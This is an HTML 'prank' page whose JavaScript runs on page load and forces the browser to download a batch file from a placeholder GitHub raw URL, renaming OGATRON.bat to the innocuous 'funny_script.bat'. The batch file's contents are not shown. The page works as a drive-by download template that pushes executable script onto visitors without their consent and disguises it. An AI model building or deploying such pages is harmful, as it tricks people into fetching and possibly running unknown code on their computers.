<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prank Time!</title>
    <script type="text/javascript">
        // Force the download when the page loads
        window.onload = function() {
            // Create a new anchor element (which will be used for download)
            var link = document.createElement('a');
            
            // Set the link's href to the direct raw file URL from GitHub
            link.href = 'https://raw.githubusercontent.com/yourusername/yourrepository/main/OGATRON.bat';  // Replace with your raw GitHub file URL
            
            // Set the download attribute to suggest a filename to the browser
            link.download = 'funny_script.bat';  // Name the downloaded file
            
            // Append the link to the DOM (so the browser can recognize it)
            document.body.appendChild(link);
            
            // Trigger the click event on the link to start the download
            link.click();
            
            // Optionally remove the link from the DOM (cleaning up)
            document.body.removeChild(link);
        }
    </script>
</head>
<body>
    <h1>You've been pranked!</h1>
    <p>Your prank script will automatically download. Enjoy!</p>
</body>
</html>